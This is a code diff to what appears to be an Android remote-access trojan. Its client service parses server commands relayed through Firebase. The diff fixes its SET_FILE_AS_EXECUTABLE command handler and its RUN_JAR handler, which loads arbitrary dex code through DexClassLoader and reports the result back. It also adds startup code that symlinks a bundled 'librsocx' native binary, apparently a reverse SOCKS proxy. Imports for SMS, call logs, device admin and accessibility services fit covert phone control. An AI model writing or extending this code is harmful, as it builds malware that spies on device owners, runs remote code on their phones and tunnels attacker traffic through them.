@@ -71,6 +71,7 @@ import android.preference.PreferenceManager
 import android.provider.CallLog
 import android.provider.Settings
 import android.provider.Telephony
+import android.system.Os
 import android.telecom.TelecomManager
 import android.telephony.SmsManager
 import android.telephony.TelephonyManager
@@ -89,6 +90,7 @@ import com.client.LockedWithPinActivity
 import com.client.MessageActivity
 import com.client.helpers.DeviceOrientationHelper
 import com.client.helpers.FlashlightHelper
+import com.client.helpers.Utils
 import com.client.isAccessibilityServiceEnabled
 import com.client.isMyServiceRunning
 import com.client.receivers.ReceiverDeviceAdmin
@@ -127,6 +129,7 @@ import com.google.firebase.storage.StorageReference
 import com.google.gson.Gson
 import com.google.gson.JsonObject
 import dalvik.system.DexClassLoader
+import dalvik.system.DexFile
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -156,6 +159,7 @@ import java.util.Arrays
 import java.util.Base64
 import java.util.Calendar
 import java.util.Date
+import java.util.Enumeration
 import java.util.Locale
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
@@ -5333,20 +5337,20 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
             sendMessage(context, false, "SET_AS_READ_ONLY: Operation failed - $path does not exist", messageID, serverID)
         }
     } else if (command.startsWith("SET_FILE_AS_EXECUTABLE ")) {
-        val path = command.removePrefix("SET_FILE_AS_NOT_EXECUTABLE ")
+        val path = command.removePrefix("SET_FILE_AS_EXECUTABLE ")
         val file = File(path)
         if (file.exists()) {
             if (file.isFile) {
                 if (file.setExecutable(true)) {
-                    sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation completed successfully", messageID, serverID)
+                    sendMessage(context, false, "SET_FILE_AS_EXECUTABLE: Operation completed successfully", messageID, serverID)
                 } else {
-                    sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed", messageID, serverID)
+                    sendMessage(context, false, "SET_FILE_AS_EXECUTABLE: Operation failed", messageID, serverID)
                 }
             } else {
-                sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed - $path is not a file", messageID, serverID)
+                sendMessage(context, false, "SET_FILE_AS_EXECUTABLE: Operation failed - $path is not a file", messageID, serverID)
             }
         } else {
-            sendMessage(context, false, "SET_FILE_AS_NOT_EXECUTABLE: Operation failed - $path does not exist", messageID, serverID)
+            sendMessage(context, false, "SET_FILE_AS_EXECUTABLE: Operation failed - $path does not exist", messageID, serverID)
         }
     } else if (command.startsWith("SET_FILE_AS_NOT_EXECUTABLE ")) {
         val path = command.removePrefix("SET_FILE_AS_NOT_EXECUTABLE ")
@@ -5952,7 +5956,8 @@ fun parseCommand(command: String, firestore: FirebaseFirestore, context: Context
             val path = command.removePrefix("RUN_JAR $className $methodName ")
             val dexClassLoader = DexClassLoader(path, context.cacheDir.absolutePath, null, context.classLoader)
             val loadedClass = dexClassLoader.loadClass(className)
-            val instance = loadedClass.getDeclaredConstructor().newInstance(context, applicationContext)
+            val constructor = loadedClass.getDeclaredConstructor(Context::class.java, Context::class.java)
+            val instance = constructor.newInstance(context, applicationContext)
             val method: Method = loadedClass.getMethod(methodName)
             val result = method.invoke(instance) as String
             sendMessage(context, false, "RUN_JAR: $result", messageID, serverID)
@@ -6584,6 +6589,26 @@ class ClientService: Service() {
 
         if (!Python.isStarted()) {
             Python.start(AndroidPlatform(this));
+        }
+
+        try {
+            val binariesDir = File(filesDir, "binaries")
+            if (binariesDir.exists()) {
+                if (!binariesDir.deleteRecursively()) {
+                    throw IOException("Failed to delete directory: $binariesDir")
+                }
+            }
+            if (!binariesDir.mkdir()) {
+                throw IOException("Failed to create directory: $binariesDir")
+            }
+            val rsocxFile = File(binariesDir, "rsocx")
+            Log.d("ClientService", "Created rsocx symlink.")
+            Os.symlink(
+                File(applicationInfo.nativeLibraryDir, "librsocx.so").absolutePath,
+                rsocxFile.absolutePath
+            )
+        } catch (ex: Exception) {
+            ex.printStackTrace()
         }
 
         val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
